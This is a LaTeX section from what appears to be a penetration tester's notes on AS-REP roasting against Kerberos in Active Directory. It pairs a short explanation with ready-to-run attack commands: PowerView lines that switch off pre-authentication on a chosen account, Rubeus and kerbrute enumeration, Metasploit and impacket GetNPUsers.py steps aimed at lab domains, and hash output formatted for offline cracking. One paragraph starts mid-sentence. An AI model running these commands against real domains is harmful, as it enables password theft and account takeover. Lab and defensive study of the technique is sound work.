\subsection{ASREPRoasting}
\label{kerberos:asrepraosting}
\emph{AS-REProasting} is an offensive  technique against Kerberos that allows
password hashes to be retrieved  for users that do not
\href{https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory}{require
pre-authentication}. In such a case an attacker can  recover a Kerberos
\verb+AS-REP+ encrypted with the users RC4-HMACâ€™d password  and he can attempt to crack this ticket offline.

Pre-authentication is the initial stage  in Kerberos authentication, which is
managed by the KDC Authentication  server and is meant to prevent brute-force
attacks.

\verb+GenericWrite+ or \verb+GenericAll+ permissions over an account, they can
enable this attribute and obtain the AS-REP ticket for offline cracking to
recover the account's password before disabling the attribute again. Like
Kerberoasting, the success of this attack depends on the account having a
relatively weak password.

\begin{verbatim}
Set-DomainObject -Identity SAMAN -XOR @{useraccountcontrol=4194304} -Verbose
\end{verbatim}

\subsubsection{Enumeration of the users}
\begin{itemize}
    \item 
        \verb+Get-ADUser+~\ref{tool:wlol:ad:get-ADUser} 
    \item 
        \verb+Get-DomainUser+~\ref{tool:powerview} with \verb+-PreauthNotRequired+
    \item 
        \verb+Rubeus asreproast /format:hashcat+ or \verb+Rubeus.exe preauthscan /users:uns.txt /domain:semperis.lab /dc:192.168.71.220+
    \item
        Powerview~\ref{tool:powerview}: \verb+Get-DomainUser -UACFilter DONT_REQ_PREAUTH+
    \item 
        kerbrute~\ref{tool:kerbrute:user-enum} flag such account during user enumeration.
    \item 
        cme~\ref{tool:crackmapexec:smb:asreproast}
    \item 
        or GetNPUsers.py~\ref{tool:impacket:GetNPUsers} from impacket
\end{itemize}

\subsubsection{Getting hashes On windows}

rubeus~\ref{tool:rubeus:asreproast}

\subsubsection{Getting hashes On linux}

metasploit: 
\begin{verbatim}
      upload /root/ASREPROAST.ps1 .
      powershell
      Import-Module .\ASREPRoast.ps1
      Invoke-ASREPRoast
\end{verbatim}


impacket~\ref{tool:impacket:GetNPUSers}:

\begin{verbatim}
GetNPUsers.py egotistical-bank.local/fsmith -request -no-pass -dc-ip 10.10.10.175
\end{verbatim}


\subsubsection{Set DONT\_REQ\_PREAUTH}

Powerview:
\begin{verbatim}
Set-DomainObject -Identity userName -XOR @{useraccountcontrol=4194304} -Verbose
\end{verbatim}

